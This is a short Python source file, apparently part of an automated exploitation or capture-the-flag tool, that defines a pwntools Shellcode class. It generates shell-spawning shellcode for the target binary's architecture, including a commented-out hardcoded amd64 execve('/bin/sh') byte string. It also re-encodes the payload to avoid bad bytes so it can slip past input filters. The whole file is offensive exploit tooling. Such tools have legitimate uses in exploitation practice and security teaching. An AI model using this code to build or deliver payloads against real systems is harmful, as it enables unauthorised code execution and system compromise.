from pwn import *


class Shellcode:
    def __init__(self, binary):
        self.binary = binary
        self.content = self.get_shellcode()

    def get_shellcode(self):
        arch = self.binary.arch
        context.binary = self.binary.elf
        context.arch = arch
        # if arch == "amd64":
        #     shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
        #     return shellcode
        # else:
        return asm(shellcraft.sh())

    def encode_using_bad_bytes(self, bytes_to_avoid):
        try:
            shellcode = encode(self.content, bytes_to_avoid)
            log.info(
                "New shellcode: {} {}".format(len(shellcode), repr(shellcode))
            )
            self.content = shellcode
        except PwnlibException:
            log.info(
                "[-] Unable to encode shellcode to avoid {}".format(bytes_to_avoid)
            )
